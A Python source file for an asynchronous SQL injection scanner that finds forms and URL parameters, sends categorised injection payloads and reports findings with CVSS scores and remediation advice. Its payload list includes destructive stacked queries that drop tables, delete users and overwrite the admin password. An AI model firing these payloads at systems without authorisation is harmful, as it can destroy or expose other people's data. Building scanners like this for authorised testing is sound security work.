# base/scanners/web/sqli_scanner.py
import asyncio
import aiohttp
import re
from typing import List, Dict
from urllib.parse import urlparse, urlencode, parse_qs

from ..base import BaseScanner, Vulnerability

class SQLIScanner(BaseScanner):
    """Advanced SQL Injection vulnerability scanner"""
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        
        # SQL injection payloads by database type
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'#",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "admin' #",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR '1'='1--",
                "') OR ('1'='1--",
            ],
            'boolean_based': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1",
                "' OR '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
            ],
            'time_based': [
                "' OR SLEEP(5)--",
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR pg_sleep(5)--",
                "' AND pg_sleep(5)--",
                "' OR BENCHMARK(5000000,MD5('test'))--",
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT @@version,2,3--",
                "' UNION SELECT user(),2,3--",
                "' UNION SELECT database(),2,3--",
            ],
            'stacked': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; DELETE FROM users WHERE username='admin'--",
            ]
        }
        
        # Database error patterns
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
                r"Zend_Db_Statement_Mysqli_Exception",
                r"Pdo_Mysql_Exception",
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s\ssyntax error at or near",
            ],
            'oracle': [
                r"Oracle.*ERROR",
                r"Oracle.*Driver",
                r"OracleException",
                r"Oracle\.DataAccess\.Client",
                r"ORA-[0-9]{5}",
                "oracle\.jdbc",
            ],
            'mssql': [
                r"Driver.*SQL Server",
                r"SQL Server.*Driver",
                r"Warning.*sqlsrv_",
                r"SQLServer JDBC Driver",
                r"com\.microsoft\.sqlserver\.jdbc",
                r"System\.Data\.SqlClient\.SqlException",
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System.Data.SQLite.SQLiteException",
                r"org.sqlite.JDBC",
                r"SQLite\.Error",
            ]
        }
        
        # Time-based detection delay
        self.time_delay = self.config.get('time_delay', 5)
        
    async def scan(self) -> 'ScanResult':
        """Execute comprehensive SQL injection scan"""
        
        # Find all injection points
        injection_points = await self._find_injection_points()
        
        # Test each injection point
        for point in injection_points:
            await self._test_injection_point(point)
        
        return self.result
    
    async def _find_injection_points(self) -> List[Dict]:
        """Find all potential SQL injection points"""
        points = []
        
        async with aiohttp.ClientSession() as session:
            try:
                # Get main page
                async with session.get(self.target, ssl=False) as response:
                    html = await response.text()
                    
                    # Find forms
                    forms = await self._extract_forms(html)
                    for form in forms:
                        points.append({
                            'type': 'form',
                            'url': self.target,
                            'method': form.get('method', 'get'),
                            'inputs': form.get('inputs', [])
                        })
                    
                    # Find URL parameters
                    parsed = urlparse(self.target)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        points.append({
                            'type': 'url_param',
                            'url': self.target,
                            'params': list(params.keys())
                        })
                    
            except Exception as e:
                self.logger.error(f"Failed to find injection points: {str(e)}")
        
        return points
    
    async def _test_injection_point(self, point: Dict):
        """Test a single injection point for SQL injection"""
        
        if point['type'] == 'form':
            await self._test_form_sqli(point)
        elif point['type'] == 'url_param':
            await self._test_url_param_sqli(point)
    
    async def _test_form_sqli(self, point: Dict):
        """Test form for SQL injection"""
        
        async with aiohttp.ClientSession() as session:
            # Error-based detection
            for payload in self.payloads['error_based']:
                form_data = {}
                for input_field in point['inputs']:
                    form_data[input_field['name']] = payload
                
                try:
                    if point['method'].lower() == 'post':
                        async with session.post(point['url'], data=form_data, ssl=False) as response:
                            html = await response.text()
                            db_type = await self._detect_database_error(html)
                            if db_type:
                                await self._report_sqli(
                                    point=point,
                                    payload=payload,
                                    type='error_based',
                                    database=db_type
                                )
                    else:
                        async with session.get(point['url'], params=form_data, ssl=False) as response:
                            html = await response.text()
                            db_type = await self._detect_database_error(html)
                            if db_type:
                                await self._report_sqli(
                                    point=point,
                                    payload=payload,
                                    type='error_based',
                                    database=db_type
                                )
                except:
                    continue
            
            # Boolean-based detection
            await self._test_boolean_based(session, point)
            
            # Time-based detection
            await self._test_time_based(session, point)
    
    async def _test_url_param_sqli(self, point: Dict):
        """Test URL parameters for SQL injection"""
        
        async with aiohttp.ClientSession() as session:
            parsed = urlparse(point['url'])
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            for param in point['params']:
                # Error-based detection
                for payload in self.payloads['error_based']:
                    params = {param: payload}
                    test_url = f"{base_url}?{urlencode(params)}"
                    
                    try:
                        async with session.get(test_url, ssl=False) as response:
                            html = await response.text()
                            db_type = await self._detect_database_error(html)
                            if db_type:
                                await self._report_sqli(
                                    point=point,
                                    payload=payload,
                                    type='error_based',
                                    database=db_type,
                                    param=param
                                )
                    except:
                        continue
                
                # Boolean-based detection
                await self._test_param_boolean_based(session, base_url, param)
                
                # Time-based detection
                await self._test_param_time_based(session, base_url, param)
    
    async def _test_boolean_based(self, session, point: Dict):
        """Test boolean-based blind SQL injection"""
        
        # Get baseline response
        baseline_html = await self._get_baseline(session, point)
        
        for input_field in point['inputs']:
            # Test true condition
            true_payload = "' AND '1'='1"
            form_data = {input_field['name']: true_payload}
            
            try:
                if point['method'].lower() == 'post':
                    async with session.post(point['url'], data=form_data, ssl=False) as response:
                        true_html = await response.text()
                else:
                    async with session.get(point['url'], params=form_data, ssl=False) as response:
                        true_html = await response.text()
                
                # Test false condition
                false_payload = "' AND '1'='2"
                form_data = {input_field['name']: false_payload}
                
                if point['method'].lower() == 'post':
                    async with session.post(point['url'], data=form_data, ssl=False) as response:
                        false_html = await response.text()
                else:
                    async with session.get(point['url'], params=form_data, ssl=False) as response:
                        false_html = await response.text()
                
                # Compare responses
                if true_html != false_html and true_html != baseline_html:
                    await self._report_sqli(
                        point=point,
                        payload="Boolean-based",
                        type='boolean_based',
                        database='unknown'
                    )
                    
            except:
                continue
    
    async def _test_time_based(self, session, point: Dict):
        """Test time-based blind SQL injection"""
        
        for input_field in point['inputs']:
            # MySQL time-based
            mysql_payload = f"' OR SLEEP({self.time_delay})--"
            form_data = {input_field['name']: mysql_payload}
            
            try:
                start_time = asyncio.get_event_loop().time()
                
                if point['method'].lower() == 'post':
                    await session.post(point['url'], data=form_data, ssl=False)
                else:
                    await session.get(point['url'], params=form_data, ssl=False)
                
                elapsed = asyncio.get_event_loop().time() - start_time
                
                if elapsed >= self.time_delay:
                    await self._report_sqli(
                        point=point,
                        payload="Time-based",
                        type='time_based',
                        database='mysql'
                    )
                    return
                    
            except:
                pass
            
            # PostgreSQL time-based
            pg_payload = f"' OR pg_sleep({self.time_delay})--"
            form_data = {input_field['name']: pg_payload}
            
            try:
                start_time = asyncio.get_event_loop().time()
                
                if point['method'].lower() == 'post':
                    await session.post(point['url'], data=form_data, ssl=False)
                else:
                    await session.get(point['url'], params=form_data, ssl=False)
                
                elapsed = asyncio.get_event_loop().time() - start_time
                
                if elapsed >= self.time_delay:
                    await self._report_sqli(
                        point=point,
                        payload="Time-based",
                        type='time_based',
                        database='postgresql'
                    )
                    return
                    
            except:
                pass
    
    async def _test_param_boolean_based(self, session, base_url: str, param: str):
        """Test URL parameter for boolean-based blind SQL injection"""
        
        # Get baseline
        baseline_url = f"{base_url}?{param}=test"
        async with session.get(baseline_url, ssl=False) as response:
            baseline_html = await response.text()
        
        # Test true condition
        true_url = f"{base_url}?{param}=test' AND '1'='1"
        async with session.get(true_url, ssl=False) as response:
            true_html = await response.text()
        
        # Test false condition
        false_url = f"{base_url}?{param}=test' AND '1'='2"
        async with session.get(false_url, ssl=False) as response:
            false_html = await response.text()
        
        if true_html != false_html and true_html != baseline_html:
            await self._report_sqli(
                point={'url': base_url},
                payload="Boolean-based",
                type='boolean_based',
                database='unknown',
                param=param
            )
    
    async def _test_param_time_based(self, session, base_url: str, param: str):
        """Test URL parameter for time-based blind SQL injection"""
        
        # MySQL
        mysql_url = f"{base_url}?{param}=test' OR SLEEP({self.time_delay})--"
        start_time = asyncio.get_event_loop().time()
        await session.get(mysql_url, ssl=False)
        elapsed = asyncio.get_event_loop().time() - start_time
        
        if elapsed >= self.time_delay:
            await self._report_sqli(
                point={'url': base_url},
                payload="Time-based",
                type='time_based',
                database='mysql',
                param=param
            )
            return
        
        # PostgreSQL
        pg_url = f"{base_url}?{param}=test' OR pg_sleep({self.time_delay})--"
        start_time = asyncio.get_event_loop().time()
        await session.get(pg_url, ssl=False)
        elapsed = asyncio.get_event_loop().time() - start_time
        
        if elapsed >= self.time_delay:
            await self._report_sqli(
                point={'url': base_url},
                payload="Time-based",
                type='time_based',
                database='postgresql',
                param=param
            )
    
    async def _detect_database_error(self, html: str) -> str:
        """Detect database type from error messages"""
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    return db_type
        return None
    
    async def _get_baseline(self, session, point: Dict) -> str:
        """Get baseline response for comparison"""
        try:
            baseline_data = {}
            for input_field in point['inputs']:
                baseline_data[input_field['name']] = 'test'
            
            if point['method'].lower() == 'post':
                async with session.post(point['url'], data=baseline_data, ssl=False) as response:
                    return await response.text()
            else:
                async with session.get(point['url'], params=baseline_data, ssl=False) as response:
                    return await response.text()
        except:
            return ""
    
    async def _extract_forms(self, html: str) -> List[Dict]:
        """Extract forms from HTML"""
        forms = []
        pattern = r'<form.*?>(.*?)</form>'
        
        for form_match in re.finditer(pattern, html, re.DOTALL | re.IGNORECASE):
            form_html = form_match.group(1)
            form = {
                'action': self._extract_attribute(form_match.group(0), 'action'),
                'method': self._extract_attribute(form_match.group(0), 'method', 'get'),
                'inputs': []
            }
            
            # Extract inputs
            input_pattern = r'<input.*?>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                input_type = self._extract_attribute(input_match.group(0), 'type', 'text')
                input_name = self._extract_attribute(input_match.group(0), 'name')
                if input_name:
                    form['inputs'].append({
                        'type': input_type,
                        'name': input_name
                    })
            
            forms.append(form)
        
        return forms
    
    async def _extract_attribute(self, tag: str, attr: str, default: str = '') -> str:
        """Extract attribute value from HTML tag"""
        pattern = f'{attr}=[\'"](.*?)[\'"]'
        match = re.search(pattern, tag, re.IGNORECASE)
        return match.group(1) if match else default
    
    async def _report_sqli(self, point: Dict, payload: str, type: str, database: str, param: str = None):
        """Report SQL injection vulnerability"""
        
        # Check if already reported
        for existing in self.result.vulnerabilities:
            if existing.name == "SQL Injection" and existing.evidence == payload:
                return
        
        # Determine severity
        severity = 'critical' if type in ['error_based', 'union_based'] else 'high'
        
        # Build evidence
        evidence = f"Type: {type}\n"
        evidence += f"Payload: {payload}\n"
        evidence += f"Database: {database}\n"
        evidence += f"URL: {point['url']}\n"
        if param:
            evidence += f"Parameter: {param}\n"
        
        # Get CVSS score
        cvss_scores = {
            'error_based': 9.0,
            'union_based': 9.0,
            'boolean_based': 7.5,
            'time_based': 7.5,
            'stacked': 9.5
        }
        
        vuln = Vulnerability(
            name="SQL Injection",
            description=f"A {type} SQL injection vulnerability was detected in the application.",
            severity=severity,
            cvss_score=cvss_scores.get(type, 8.0),
            cvss_vector=f"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            cwe_id="CWE-89",
            affected_component="Database Layer",
            remediation=self._get_sqli_remediation(type, database),
            evidence=evidence,
            proof_of_concept=f"Use payload: {payload}",
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
                f"https://portswigger.net/web-security/sql-injection"
            ],
            tags=['sqli', type, database]
        )
        
        self.add_vulnerability(vuln)
        self.logger.warning(f"SQL injection vulnerability found: {type} at {point['url']}")
    
    def _get_sqli_remediation(self, type: str, database: str) -> str:
        """Get SQL injection remediation advice"""
        return """
            1. Use parameterized queries/prepared statements
            2. Implement proper input validation
            3. Use stored procedures
            4. Escape all user input
            5. Implement least privilege principle for database accounts
            6. Use web application firewall (WAF)
            7. Regular security audits and code reviews
            8. Keep database and application software updated
        """